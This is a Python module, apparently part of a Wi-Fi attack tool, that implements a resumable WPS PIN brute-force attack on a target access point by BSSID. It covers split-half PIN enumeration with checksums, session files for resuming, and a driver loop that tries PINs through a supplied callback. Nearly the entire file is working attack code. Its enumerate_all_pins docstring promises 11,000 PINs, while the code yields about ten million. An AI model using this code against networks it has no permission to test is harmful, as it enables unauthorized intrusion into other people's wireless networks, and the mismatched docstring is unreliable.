"""Deterministic, resumable WPS PIN brute force.

Implements the classic split-half attack: try all 10,000 first-half PINs
(0000-9999), then for successful first halves, try all 1,000 second-half
suffixes (000-999). Progress is atomically saved after each PIN attempt,
allowing resumption after interruption.

The implementation deliberately avoids recursion and maintains exact coverage
of the PIN space with correct WPS checksums.
"""

from __future__ import annotations

from dataclasses import asdict, dataclass
from datetime import datetime, timezone
import json
import os
from pathlib import Path
import tempfile
from typing import Callable, Iterator

from .pin_generator import wps_checksum


@dataclass(frozen=True, slots=True)
class BruteforceProgress:
    """Immutable snapshot of brute force state."""
    
    bssid: str
    started_at: str  # ISO 8601 UTC
    phase: str  # "first_half" or "second_half"
    first_half: int  # 0..9999
    second_half: int  # 0..999, only meaningful in second_half phase
    attempts: int
    successful_first_halves: tuple[int, ...]  # First halves that passed
    
    def to_pin(self) -> str:
        """Current PIN being tested."""
        if self.phase == "first_half":
            # For first-half testing, use arbitrary second half (000)
            pin_7digit = (self.first_half * 1000)
        else:
            # In second_half phase, first_half is an index into successful_first_halves
            actual_first = self.get_actual_first_half()
            pin_7digit = (actual_first * 1000) + self.second_half
        
        checksum = wps_checksum(pin_7digit)
        return f"{pin_7digit:07d}{checksum}"
    
    def is_complete(self) -> bool:
        """True if all PINs have been attempted."""
        if self.phase == "first_half":
            return self.first_half >= 10000
        # In second half, complete when all successful first halves exhausted
        return self.first_half >= len(self.successful_first_halves)
    
    def next_attempt(self, *, first_half_success: bool = False) -> BruteforceProgress:
        """Return next progress state after current attempt."""
        if self.phase == "first_half":
            new_successful = self.successful_first_halves
            if first_half_success:
                new_successful = (*self.successful_first_halves, self.first_half)
            
            next_first = self.first_half + 1
            if next_first >= 10000:
                # Transition to second half phase
                if new_successful:
                    return BruteforceProgress(
                        bssid=self.bssid,
                        started_at=self.started_at,
                        phase="second_half",
                        first_half=0,  # Index into successful_first_halves
                        second_half=0,
                        attempts=self.attempts + 1,
                        successful_first_halves=new_successful,
                    )
                else:
                    # No successful first halves; mark complete
                    return BruteforceProgress(
                        bssid=self.bssid,
                        started_at=self.started_at,
                        phase="first_half",
                        first_half=10000,  # Sentinel for complete
                        second_half=0,
                        attempts=self.attempts + 1,
                        successful_first_halves=(),
                    )
            
            return BruteforceProgress(
                bssid=self.bssid,
                started_at=self.started_at,
                phase="first_half",
                first_half=next_first,
                second_half=0,
                attempts=self.attempts + 1,
                successful_first_halves=new_successful,
            )
        
        else:  # second_half phase
            next_second = self.second_half + 1
            if next_second >= 1000:
                # Move to next successful first half
                next_first_index = self.first_half + 1
                if next_first_index >= len(self.successful_first_halves):
                    # All second halves for all successful first halves tested
                    return BruteforceProgress(
                        bssid=self.bssid,
                        started_at=self.started_at,
                        phase="second_half",
                        first_half=len(self.successful_first_halves),  # Sentinel
                        second_half=1000,
                        attempts=self.attempts + 1,
                        successful_first_halves=self.successful_first_halves,
                    )
                return BruteforceProgress(
                    bssid=self.bssid,
                    started_at=self.started_at,
                    phase="second_half",
                    first_half=next_first_index,
                    second_half=0,
                    attempts=self.attempts + 1,
                    successful_first_halves=self.successful_first_halves,
                )
            
            return BruteforceProgress(
                bssid=self.bssid,
                started_at=self.started_at,
                phase="second_half",
                first_half=self.first_half,
                second_half=next_second,
                attempts=self.attempts + 1,
                successful_first_halves=self.successful_first_halves,
            )
    
    def get_actual_first_half(self) -> int:
        """In second_half phase, return the actual first-half value being tested."""
        if self.phase == "second_half" and self.first_half < len(self.successful_first_halves):
            return self.successful_first_halves[self.first_half]
        return self.first_half


class BruteforceSession:
    """Resumable WPS PIN brute force coordinator."""
    
    def __init__(
        self,
        bssid: str,
        *,
        session_dir: str | os.PathLike[str] | None = None,
        session_id: str | None = None,
    ) -> None:
        self.bssid = bssid.replace(":", "").replace("-", "").replace(".", "").upper()
        if len(self.bssid) != 12 or not self.bssid.isalnum():
            raise ValueError(f"Invalid BSSID: {bssid!r}")
        
        self.session_id = session_id or self._generate_session_id()
        self.session_dir = (
            Path(session_dir) if session_dir is not None
            else self._default_session_dir()
        )
        self.session_file = self.session_dir / f"bruteforce_{self.bssid}_{self.session_id}.json"
        self._progress: BruteforceProgress | None = None
    
    @staticmethod
    def _default_session_dir() -> Path:
        state_home = os.environ.get("XDG_STATE_HOME")
        base = Path(state_home) if state_home else Path.home() / ".local" / "state"
        return base / "wifit" / "bruteforce-sessions"
    
    @staticmethod
    def _generate_session_id() -> str:
        return datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    
    def start(self) -> BruteforceProgress:
        """Initialize or resume brute force session."""
        loaded = self.load()
        if loaded is not None and not loaded.is_complete():
            self._progress = loaded
            return loaded
        
        # Start new session
        self._progress = BruteforceProgress(
            bssid=self.bssid,
            started_at=datetime.now(timezone.utc).isoformat(),
            phase="first_half",
            first_half=0,
            second_half=0,
            attempts=0,
            successful_first_halves=(),
        )
        self.save()
        return self._progress
    
    def save(self) -> None:
        """Atomically save current progress."""
        if self._progress is None:
            return
        
        self.session_dir.mkdir(parents=True, exist_ok=True, mode=0o700)
        
        payload = {
            "version": 1,
            "bssid": self._progress.bssid,
            "started_at": self._progress.started_at,
            "updated_at": datetime.now(timezone.utc).isoformat(),
            "phase": self._progress.phase,
            "first_half": self._progress.first_half,
            "second_half": self._progress.second_half,
            "attempts": self._progress.attempts,
            "successful_first_halves": list(self._progress.successful_first_halves),
            "complete": self._progress.is_complete(),
        }
        
        descriptor, temp_path = tempfile.mkstemp(
            prefix=f".{self.session_file.name}.",
            suffix=".tmp",
            dir=str(self.session_dir),
            text=True,
        )
        try:
            os.fchmod(descriptor, 0o600)
            with os.fdopen(descriptor, "w", encoding="utf-8") as session_file:
                json.dump(payload, session_file, indent=2, ensure_ascii=False)
                session_file.write("\n")
                session_file.flush()
                os.fsync(session_file.fileno())
            os.replace(temp_path, self.session_file)
            os.chmod(self.session_file, 0o600)
        except Exception:
            try:
                os.close(descriptor)
            except OSError:
                pass
            try:
                os.unlink(temp_path)
            except OSError:
                pass
            raise
    
    def load(self) -> BruteforceProgress | None:
        """Load progress from session file if it exists."""
        if not self.session_file.exists():
            return None
        
        try:
            with self.session_file.open("r", encoding="utf-8") as session_file:
                payload = json.load(session_file)
        except (OSError, json.JSONDecodeError):
            return None
        
        if not isinstance(payload, dict) or payload.get("version") != 1:
            return None
        
        try:
            successful = payload.get("successful_first_halves", [])
            if not isinstance(successful, list):
                return None
            
            progress = BruteforceProgress(
                bssid=str(payload["bssid"]),
                started_at=str(payload["started_at"]),
                phase=str(payload["phase"]),
                first_half=int(payload["first_half"]),
                second_half=int(payload["second_half"]),
                attempts=int(payload["attempts"]),
                successful_first_halves=tuple(int(item) for item in successful),
            )
            self._progress = progress
            return progress
        except (KeyError, TypeError, ValueError):
            return None
    
    def update(self, *, first_half_success: bool = False) -> BruteforceProgress:
        """Advance to next PIN and save progress."""
        if self._progress is None:
            raise RuntimeError("Session not started; call start() first")
        
        self._progress = self._progress.next_attempt(first_half_success=first_half_success)
        self.save()
        return self._progress
    
    def get_progress(self) -> BruteforceProgress | None:
        """Return current progress without mutating state."""
        return self._progress
    
    def delete(self) -> None:
        """Delete the session file."""
        try:
            self.session_file.unlink()
        except FileNotFoundError:
            pass
    
    def iterate_pins(self) -> Iterator[tuple[BruteforceProgress, str]]:
        """Yield (progress, pin) for all remaining PINs.
        
        This is a non-blocking iterator. Callers must save progress externally
        if they want resumption across process restarts.
        """
        progress = self.start()
        
        while not progress.is_complete():
            pin = progress.to_pin()
            yield progress, pin
            progress = progress.next_attempt()
        
        self._progress = progress
        self.save()


def enumerate_all_pins(*, include_zero: bool = True) -> Iterator[str]:
    """Enumerate all 11,000 valid WPS PINs in split-half order.
    
    Yields PINs in the order they would be tried during brute force:
    first all first-halves with arbitrary second-half (000), then after
    assuming all first-halves succeeded, all second-halves for each.
    
    Args:
        include_zero: If True, include 00000000 (often invalid but worth trying)
    """
    # First half: 0000-9999 with second half 000
    start = 0 if include_zero else 1
    for first in range(start, 10000):
        pin_7digit = first * 1000
        checksum = wps_checksum(pin_7digit)
        yield f"{pin_7digit:07d}{checksum}"
    
    # Second half: for each first half, try all 000-999 second halves
    # (In real attack, only successful first halves are expanded)
    for first in range(start, 10000):
        for second in range(1000):
            pin_7digit = (first * 1000) + second
            checksum = wps_checksum(pin_7digit)
            candidate = f"{pin_7digit:07d}{checksum}"
            # Skip if we already yielded this in first-half phase
            if second == 0:
                continue
            yield candidate


FirstHalfCallback = Callable[[int, bool], None]
SecondHalfCallback = Callable[[int, int, bool], None]


def bruteforce_with_callbacks(
    bssid: str,
    try_pin: Callable[[str], tuple[bool, bool]],
    *,
    first_half_callback: FirstHalfCallback | None = None,
    second_half_callback: SecondHalfCallback | None = None,
    session_dir: str | os.PathLike[str] | None = None,
    session_id: str | None = None,
) -> tuple[str | None, int]:
    """Execute resumable brute force with progress callbacks.
    
    Args:
        bssid: Target BSSID
        try_pin: Function (pin) -> (successful, first_half_valid).
                 Returns (True, True/False) on success, (False, True) if first
                 half valid but not cracked, (False, False) if first half invalid.
        first_half_callback: Called after each first-half attempt with (first_half, valid)
        second_half_callback: Called after each second-half attempt with 
                              (first_half, second_half, success)
        session_dir: Directory for session files
        session_id: Session identifier for resume
    
    Returns:
        (successful_pin, total_attempts) or (None, total_attempts) if exhausted
    """
    session = BruteforceSession(bssid, session_dir=session_dir, session_id=session_id)
    progress = session.start()
    
    while not progress.is_complete():
        pin = progress.to_pin()
        success, first_half_valid = try_pin(pin)
        
        if progress.phase == "first_half":
            if first_half_callback:
                first_half_callback(progress.first_half, first_half_valid)
            
            if success:
                session.delete()
                return pin, progress.attempts + 1
            
            progress = session.update(first_half_success=first_half_valid)
        
        else:  # second_half phase
            actual_first = progress.get_actual_first_half()
            if second_half_callback:
                second_half_callback(actual_first, progress.second_half, success)
            
            if success:
                session.delete()
                return pin, progress.attempts + 1
            
            progress = session.update()
    
    # Exhausted all PINs
    session.delete()
    return None, progress.attempts


__all__ = [
    "BruteforceProgress",
    "BruteforceSession",
    "bruteforce_with_callbacks",
    "enumerate_all_pins",
]
